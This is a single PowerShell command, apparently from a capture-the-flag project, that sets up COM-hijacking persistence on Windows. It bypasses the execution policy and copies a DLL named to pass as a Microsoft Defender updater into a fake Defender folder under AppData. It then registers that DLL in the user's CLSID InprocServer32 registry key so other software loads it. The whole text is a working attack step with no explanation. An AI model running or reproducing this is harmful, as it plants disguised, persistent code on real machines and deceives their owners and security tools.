powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-Location -Path 'C:\Users\auton\OneDrive\Documents\src\ctf-battle\letmein'; if (-not (Test-Path "C:\Temp")) { New-Item -ItemType Directory -Path "C:\Temp" -Force | Out-Null }; $currentDir=Get-Location; $sourcePath="ms_defender_updater.dll"; $destinationDir="$env:APPDATA\Microsoft\Defender\1.0.3"; $dllPath=Join-Path $destinationDir "ms_defender_updater.dll"; Write-Output "Source Path: $sourcePath" | Out-File "C:\Temp\debug_log.txt" -Append; Write-Output "Destination Path: $dllPath" | Out-File "C:\Temp\debug_log.txt" -Append; if (Test-Path $sourcePath) { Write-Output "Source file exists: $sourcePath" | Out-File "C:\Temp\debug_log.txt" -Append } else { Write-Output "Source file not found: $sourcePath" | Out-File "C:\Temp\debug_log.txt" -Append; Exit }; if (-not (Test-Path $destinationDir)) { Write-Output "Creating destination directory: $destinationDir" | Out-File "C:\Temp\debug_log.txt" -Append; New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null }; try { Copy-Item -Path $sourcePath -Destination $dllPath -Force; Write-Output "Copied $sourcePath to $dllPath successfully" | Out-File "C:\Temp\debug_log.txt" -Append } catch { Write-Output "Error copying file: $_" | Out-File "C:\Temp\debug_log.txt" -Append; Exit }; $clsid="{0358B920-0AC7-461F-98F4-58E32CD89148}"; $regPath="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"; if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }; Set-ItemProperty -Path $regPath -Name "(Default)" -Value $dllPath; Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"